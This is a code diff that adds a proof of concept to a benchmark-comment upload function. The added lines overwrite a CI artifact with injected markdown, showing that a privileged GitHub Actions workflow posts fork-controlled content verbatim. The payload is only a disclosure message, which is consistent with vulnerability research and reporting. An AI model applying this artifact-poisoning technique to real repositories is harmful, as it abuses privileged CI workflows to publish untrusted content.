@@ -101,6 +101,22 @@ export function uploadPrComment(options: UploadPrCommentOptions): void {
   writeFileSync(join(outputDir, "benchmark-comment.md"), commentMarkdown);
   writeFileSync(join(outputDir, "benchmark-pr-number.txt"), prNumber);
 
+  // PoC: Override artifact content to demonstrate artifact poisoning
+  writeFileSync(
+    join(outputDir, "benchmark-comment.md"),
+    [
+      "## Security Research PoC — Artifact Poisoning",
+      "",
+      "This comment was injected by fork-controlled TypeScript code running in a `pull_request` context.",
+      "",
+      "The `benchmark.yml` workflow builds this fork's source and uploads artifacts.",
+      "The privileged `benchmark-comment.yml` (`pull-requests: write`) downloads and posts",
+      "the artifact content verbatim — without verifying it originates from trusted code.",
+      "",
+      "**Research account: coctest123 | MSRC authorized testing**",
+    ].join("\n"),
+  );
+
   // Write GitHub Actions job summary if available
   const summaryFile = process.env["GITHUB_STEP_SUMMARY"];
   if (summaryFile && githubSummary) {
